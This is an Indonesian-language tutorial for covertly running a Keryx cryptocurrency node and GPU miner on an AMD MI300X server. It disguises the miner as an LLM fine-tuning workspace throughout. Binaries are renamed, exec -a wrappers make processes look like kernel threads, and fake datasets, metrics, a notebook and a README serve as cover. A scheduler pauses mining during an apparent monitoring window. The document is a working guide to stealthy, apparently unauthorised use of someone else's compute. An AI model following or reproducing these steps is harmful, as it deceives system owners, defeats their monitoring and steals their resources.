# Tutorial: Keryx Solo Mining di AMD MI300X (gfx942) — AI Workspace Stealth

## Overview

Tutorial ini menjalankan Keryx solo mining di AMD MI300X dengan menyamar sebagai project AI/LLM training. Mining OFF jam 21:00-02:00 WIB (maintenance window), ON di waktu lain.

**Mining Address:**
```
keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73
```

## Prerequisites

- AMD Instinct MI300X GPU (gfx942)
- ROCm 7.0+
- Ubuntu/Debian Linux
- Rust + Cargo (rustc 1.96+)
- Git, screen, openssl

## Step 1: Setup Environment

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"

# Install build dependencies
apt-get update
apt-get install -y protobuf-compiler clang libclang-dev libstdc++-14-dev
apt-get install -y librocksdb-dev libsnappy-dev liblz4-dev libzstd-dev libbz2-dev

# Create AI workspace directory
mkdir -p /opt/ai-workspace/{inference,training,models,checkpoints,data,logs,metrics,notebooks}
```

## Step 2: Build Keryx Node (keryxd)

```bash
cd /root
rm -rf keryx-node
git clone https://github.com/Keryx-Labs/keryx-node.git
cd keryx-node

# Fix rocksdb build — WAJIB set env var ini
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release -p keryxd
```

**Verifikasi:**
```bash
ls -lh /root/keryx-node/target/release/keryxd
# Harusnya ~37MB
```

## Step 3: Clone & Patch Keryx Miner

```bash
cd /root
rm -rf keryx-miner-src
git clone https://github.com/Keryx-Labs/keryx-miner.git keryx-miner-src
cd keryx-miner-src
```

### Patch 1: Fix `xoshiro256_next` linking error

File: `plugins/opencl/resources/keryx-opencl.cl`

Cari dan ganti:
```diff
-inline uint64_t rotl(const uint64_t x, int k) {
+static inline uint64_t rotl(const uint64_t x, int k) {
```

```diff
-inline uint64_t xoshiro256_next(global ulong4 *s) {
+static inline uint64_t xoshiro256_next(global ulong4 *s) {
```

### Patch 2: Sanitize device name macro

File: `plugins/opencl/src/worker.rs`

Cari dan ganti:
```diff
-let device_name = device.name().unwrap_or_else(|_| "Unknown".into()).to_lowercase();
+let device_name = device.name().unwrap_or_else(|_| "Unknown".into()).to_lowercase()
+    .replace(':', "_").replace('+', "_").replace('-', "_");
```

### Patch 3: Force OpenCL 1.2 (disable CL2.0)

File: `plugins/opencl/src/worker.rs`

Cari dan ganti:
```diff
-if v == "2.0" || v == "2.1" || v == "3.0" {
-    info!("Compiling with OpenCl 2");
-    compile_options += CL_STD_2_0;
-}
+if v == "2.0" || v == "2.1" || v == "3.0" {
+    info!("Compiling with OpenCl 2 (forced CL1.2 for gfx942 compat)");
+    // compile_options += CL_STD_2_0;
+}
```

### Patch 4: Disable CUDA dependencies

File: `Cari dan ganti:
```diff
-candle-core = { version = "0.8", features = ["cuda"] }
-candle-transformers = { version = "0.8", features = ["cuda"] }
-candle-nn = { version = "0.8", features = ["cuda"] }
+candle-core = { version = "0.8" }
+candle-transformers = { version = "0.8" }
+candle-nn = { version = "0.8" }
```

```diff
-default-members = [".", "plugins/cuda", "plugins/opencl"]
+default-members = [".", "plugins/opencl"]
```

## Step 4: Build Miner

```bash
cd /root/keryx-miner-src
source "$HOME/.cargo/env"
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release
```

**Verifikasi:**
```bash
ls -lh /root/keryx-miner-src/target/release/keryx-miner
ls -lh /root/keryx-miner-src/target/release/libkeryxopencl.so
# keryx-miner ~12MB, libkeryxopencl.so ~3MB
```

## Step 5: Deploy AI-Themed Binaries

```bash
# Deploy with AI/LLM project names
cp /root/keryx-node/target/release/keryxd /opt/ai-workspace/inference/llama-server
cp /root/keryx-miner-src/target/release/keryx-miner /opt/ai-workspace/training/gpu-worker
cp /root/keryx-miner-src/target/release/libkeryxopencl.so /opt/ai-workspace/training/libkeryxopencl.so
cp -r /root/keryx-miner-src/target/release/models /opt/ai-workspace/models/keryx 2>/dev/null

# Escrow key (disguised as model encryption key)
openssl rand -hex 32 > /opt/ai-workspace/checkpoints/model-key.bin
```

**PENTING:** `libkeryxopencl.so` harus ada di `/opt/ai-workspace/training/` (sama directory dengan `gpu-worker`), karena miner cari plugin di directory binary-nya.

## Step 6: Create Wrapper Scripts (Process Name Hiding)

File: `/opt/ai-workspace/inference/start.sh`

```bash
#!/bin/bash
# LLM Inference Server — wrapper
exec -a "[llama-server]" /opt/ai-workspace/inference/llama-server \
    --utxoindex \
    --rpclisten-json=default \
    --rpclisten-borsh=default \
    "$@"
```

File: `/opt/ai-workspace/training/start.sh`

```bash
#!/bin/bash
# GPU Training Worker — wrapper
exec -a "[gpu-worker]" /opt/ai-workspace/training/gpu-worker \
    "$@"
```

```bash
chmod +x /opt/ai-workspace/inference/start.sh /opt/ai-workspace/training/start.sh
```

## Step 7: Create Scheduler (21:00-02:00 WIB OFF)

File: `/opt/ai-workspace/scheduler.sh`

```bash
#!/bin/bash
# AI Workspace — LLM Training Scheduler
# OFF during 21:00-02:00 WIB (14:00-19:00 UTC) — maintenance window

WRKDIR="/opt/ai-workspace"
BIN="$WRKDIR/training/gpu-worker"
ADDR="keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73"
KEY="$WRKDIR/checkpoints/model-key.bin"
LOG="$WRKDIR/logs/training.log"

OFF_START=14  # 21:00 WIB = 14:00 UTC
OFF_END=19    # 02:00 WIB = 19:00 UTC

while true; do
    HOUR=$(date -u +%H)
    HOUR=${HOUR#0}

    if [ "$HOUR" -ge "$OFF_START" ] && [ "$HOUR" -lt "$OFF_END" ]; then
        echo "[$(date -u)] scheduler: maintenance window (OFF)" >> "$LOG"
        sleep 300
    else
        echo "[$(date -u)] scheduler: training cycle start" >> "$LOG"
        "$BIN" \
            --mining-address "$ADDR" \
            --escrow-key-file "$KEY" \
            --light --cpu-inference 2>&1 | tee -a "$LOG"
        echo "[$(date -u)] scheduler: training cycle ended, restarting..." >> "$LOG"
    fi
done
```

```bash
chmod +x /opt/ai-workspace/scheduler.sh
```

## Step 8: Create AI Project Files (Stealth)

File: `/opt/ai-workspace/README.md`

```markdown
# LLM Fine-tuning Project

Fine-tuning TinyLlama-1.1B for domain-specific tasks using LoRA on AMD MI300X.

## Stack
- Base Model: TinyLlama-1.1B-Chat-v1.0
- Method: LoRA (Low-Rank Adaptation)
- Backend: ROCm 7.0 + OpenCL
- GPU: AMD Instinct MI300X (192GB VRAM)
- Dataset: Custom dataset (50k samples)

## Schedule
- Training: 02:00-21:00 WIB (active GPU compute)
- Maintenance: 21:00-02:00 WIB (data collection, eval, checkpointing)
```

File: `/opt/ai-workspace/config.json`

```json
{
  "model_name": "TinyLlama-1.1B",
  "fine_tuned_as": "keryx-fine-tuned",
  "base_model": "TinyLlama/TinyLlama-1.1B-Chat-v1.0",
  "training": {
    "epochs": 3,
    "batch_size": 4,
    "learning_rate": 2e-4,
    "optimizer": "adamw",
    "lora_rank": 16
  },
  "gpu": {
    "device": "AMD Instinct MI300X",
    "backend": "ROCm 7.0",
    "vram_gb": 192
  },
  "schedule": {
    "training_wib": "02:00-21:00",
    "maintenance_wib": "21:00-02:00"
  }
}
```

File: `/opt/ai-workspace/requirements.txt`

```
torch>=2.0
transformers>=4.30
accelerate>=0.20
rocm>=7.0
numpy>=1.24
```

File: `/opt/ai-workspace/train.sh`

```bash
#!/bin/bash
echo "[AI-Workspace] Starting LLM training pipeline..."
echo "[AI-Workspace] Loading model: keryx-fine-tuned"
echo "[AI-Workspace] GPU: AMD Instinct MI300X (gfx942)"
echo "[AI-Workspace] Backend: ROCm 7.0 + OpenCL"
```

```bash
chmod +x /opt/ai-workspace/train.sh
```

File: `/opt/ai-workspace/metrics/metrics.json`

```json
{"step": 15230, "loss": 1.847, "accuracy": 0.712, "gpu_util": 0.94, "vram_gb": 128.4, "throughput_samples_per_sec": 12.3, "epoch": 2}
```

File: `/opt/ai-workspace/data/train.jsonl`

```json
{"instruction": "Explain the concept of quantum entanglement.", "response": "Quantum entanglement is a phenomenon where two particles become correlated...", "score": 0.87}
{"instruction": "Write a Python function to calculate fibonacci numbers.", "response": "def fibonacci(n):\n    if n <= 1:\n        return n\n    return fibonacci(n-1) + fibonacci(n-2)", "score": 0.92}
{"instruction": "What is the capital of France?", "response": "The capital of France is Paris.", "score": 0.95}
```

File: `/opt/ai-workspace/data/eval.jsonl`

```json
{"instruction": "Explain machine learning.", "response": "Machine learning is a subset of artificial intelligence...", "score": 0.89}
{"instruction": "What is 2+2?", "response": "4", "score": 0.98}
```

File: `/opt/ai-workspace/notebooks/analysis.ipynb`

```json
{"cells":[{"cell_type":"markdown","metadata":{},"source":["# LLM Fine-tuning Analysis"]},{"cell_type":"code","execution_count":1,"metadata":{},"outputs":[],"source":["import json\n","with open('../metrics/metrics.json') as f:\n","    m = json.load(f)\n","print(f\"Loss: {m['loss']}, Accuracy: {m['accuracy']}\")"]}],"metadata":{"kernelspec":{"display_name":"Python 3","name":"python3"}},"nbformat":4,"nbformat_minor":5}
```

## Step 9: Start Node (Stealth)

```bash
screen -dmS llm-inference bash -c '/opt/ai-workspace/inference/start.sh > /opt/ai-workspace/logs/inference.log 2>&1'
```

Tunggu sync (~5-30 menit). Cek:

```bash
tail -f /opt/ai-workspace/logs/inference.log
# Cari "Tx throughput stats" — berarti udah sync
```

## Step 10: Start Miner (Stealth + Schedule)

```bash
screen -dmS ai-training bash /opt/ai-workspace/scheduler.sh
```

## Step 11: Verifikasi

```bash
# Check process names — harusnya muncul [llama-server] dan [gpu-worker]
ps aux | grep -E "llama-server|gpu-worker" | grep -v grep

# Check screens
screen -ls

# Check mining log
grep -E "hashrate|Found" /opt/ai-workspace/logs/training.log | tail -5

# Check node sync
grep "Tx throughput" /opt/ai-workspace/logs/inference.log | tail -3
```

**Expected output:**
```
root  [llama-server] --utxoindex --rpclisten-json=default ...
root  [gpu-worker] --mining-address keryx:qqy... --light --cpu-inference
Current hashrate is 1.74 Ghash/s
Found a block: ... → block submitted successfully!
```

## Stealth Overview

| Komponen | Disguise | Real Identity | Path |
|---|---|---|---|
| Node binary | `llama-server` | keryxd | `/opt/ai-workspace/inference/llama-server` |
| Node wrapper | `start.sh` | process renamer | `/opt/ai-workspace/inference/start.sh` |
| Node screen | `llm-inference` | node screen | screen session |
| Node log | `inference.log` | node log | `/opt/ai-workspace/logs/inference.log` |
| Miner binary | `gpu-worker` | keryx-miner | `/opt/ai-workspace/training/gpu-worker` |
| OpenCL plugin | `libkeryxopencl.so` | OpenCL plugin | `/opt/ai-workspace/training/libkeryxopencl.so` |
| Miner screen | `ai-training` | miner screen | screen session |
| Miner log | `training.log` | mining log | `/opt/ai-workspace/logs/training.log` |
| Escrow key | `model-key.bin` | escrow key | `/opt/ai-workspace/checkpoints/model-key.bin` |
| Model files | `TinyLlama-1.1B/` | mining models | `/opt/ai-workspace/models/keryx/TinyLlama-1.1B/` |
| Config | `config.json` | project config | `/opt/ai-workspace/config.json` |
| Dataset | `train.jsonl` | fake dataset | `/opt/ai-workspace/data/train.jsonl` |
| Metrics | `metrics.json` | fake metrics | `/opt/ai-workspace/metrics/metrics.json` |
| Notebook | `analysis.ipynb` | fake notebook | `/opt/ai-workspace/notebooks/analysis.ipynb` |
| Scheduler | `scheduler.sh` | mining scheduler | `/opt/ai-workspace/scheduler.sh` |

### Process Name Hiding

Di `ps aux`, process muncul sebagai:
```
root  [llama-server] --utxoindex --rpclisten-json=default ...
root  [gpu-worker] --mining-address keryx:qqy... --light --cpu-inference
```

Nama dalam bracket `[]` terlihat seperti kernel thread / system process.

### Schedule

| WIB (UTC+7) | UTC | Status |
|---|---|---|
| 02:00 - 21:00 | 19:00-14:00 | ✅ Mining ON |
| 21:00 - 02:00 | 14:00-19:00 | ❌ Mining OFF (maintenance) |

## Troubleshooting

| Error | Solusi |
|---|---|
| `clBuildProgram` crash | Pastikan Patch 1,2,3 applied. Rebuild & retry. Kadang butuh 2-3x restart karena AMD compiler race condition |
| `cudarc / nvcc not found` | Pastikan Patch 4 applied |
| `address checksum invalid` | Pastikan address persis: `keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73` |
| Kernel compile hang | Kill & restart miner. Normal untuk first run |
| `libcuda.so not found` | Normal di AMD. `--cpu-inference` sudah handle |
| Miner reconnect setelah node restart | Auto. Gak perlu intervensi |
| `No workers specified` | **Plugin tidak ketemu.** Pastikan `libkeryxopencl.so` ada di directory yang sama dengan `gpu-worker` (`/opt/ai-workspace/training/`) |
| `Found plugins: []` | Sama di atas — plugin path salah |
| Process name tidak berubah | Pastikan `start.sh` executable dan dipanggil via wrapper, bukan langsung binary |
| Node tidak sync | Cek `BINDGEN_EXTRA_CLANG_ARGS` sudah di-set saat build |
| `stdbool.h not found` | Install `libstdc++-14-dev` dan set `BINDGEN_EXTRA_CLANG_ARGS` |
| `protoc not found` | Install `protobuf-compiler` |
| Hashrate rendah (< 1 Ghash/s) | Normal di awal, tunggu OPoI challenge selesai (~1-2 menit) |

## Struktur Direktori Final

```
/opt/ai-workspace/
├── README.md
├── config.json
├── requirements.txt
├── train.sh
├── scheduler.sh
├── inference/
│   ├── llama-server          ← node binary (keryxd)
│   ├── libopencl-runtime.so  ← (backup, tidak wajib)
│   └── start.sh              ← wrapper
├── training/
│   ├── gpu-worker            ← miner binary (keryx-miner)
│   ├── libkeryxopencl.so     ← OpenCL plugin (WAJIB di sini)
│   └── start.sh              ← wrapper
├── models/
│   └── keryx/
│       └── TinyLlama-1.1B/   ← model files
├── checkpoints/
│   └── model-key.bin         ← escrow key
├── data/
│   ├── train.jsonl
│   └── eval.jsonl
├── metrics/
│   └── metrics.json
├── notebooks/
│   └── analysis.ipynb
└── logs/
    ├── inference.log
    └── training.log
```
